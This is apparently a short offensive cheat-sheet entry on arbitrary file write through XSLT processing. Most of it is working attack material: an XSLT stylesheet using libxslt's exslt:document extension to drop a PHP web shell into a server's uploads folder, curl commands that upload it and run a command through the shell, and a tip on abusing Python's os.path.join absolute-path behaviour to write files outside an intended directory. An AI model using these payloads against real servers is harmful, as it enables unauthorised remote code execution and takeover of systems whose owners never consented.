# XSLT exslt:document File Write

When a server processes user-supplied XSLT using `libxslt` with the `exslt:document` extension enabled, you can write arbitrary files to the server.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/html/uploads/shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['cmd']); ?&gt;</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

Send as the XSLT parameter to the transformation endpoint:
```bash
curl -X POST http://<TARGET>/transform \
  -F "xslt=@evil.xsl" -F "xml=<root/>"
curl "http://<TARGET>/uploads/shell.php?cmd=id"
```

`os.path.join` absolute-path injection (Flask/Python): if user input is joined to a base path and starts with `/`, Python discards the base:
```python
os.path.join('/var/www/uploads', '/etc/passwd')  # -> '/etc/passwd'
```
Supply a `/`-prefixed path in any upload `destination` or `output` parameter to write outside the intended directory.
